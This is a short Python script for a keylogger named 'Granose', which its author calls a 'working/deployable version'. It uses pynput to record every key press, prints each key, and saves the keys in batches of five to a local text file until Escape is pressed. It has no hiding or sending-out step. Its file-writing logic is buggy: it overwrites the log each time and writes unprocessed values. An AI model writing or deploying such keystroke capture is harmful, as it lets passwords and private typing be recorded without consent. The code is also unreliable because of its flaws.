'''
Granose is the first flake cereal which was created by Kellogg.
Of course, like Kellogg's cereal, there were versions before but this will be the first working/deployable version!
'''

from pynput.keyboard import Key, Listener # can also control devices but lets stick with monitoring them for now
import os, sys #will be used for finding if the file exists
import shutil #to copy txt files
import datetime #timestaps

count = 0
keys = []

#apparetnly this is the only way to do keyloggers in python
def onPress(key):
	global keys, count
	keys.append(key)
	count +=1
	print("{0} pressed".format(key))
	if count >= 5:
		count = 0
		writeFile(str(keys))
		keys = []

def writeFile(keys):
	with open("32log.txt", "w") as f:
		for key in keys:
			k = str(key).replace("'","")
			f.write(key)


def onRel(key):
	if key==Key.esc:
		return False

with Listener(on_press=onPress, on_release=onRel) as listener:
	listener.join()


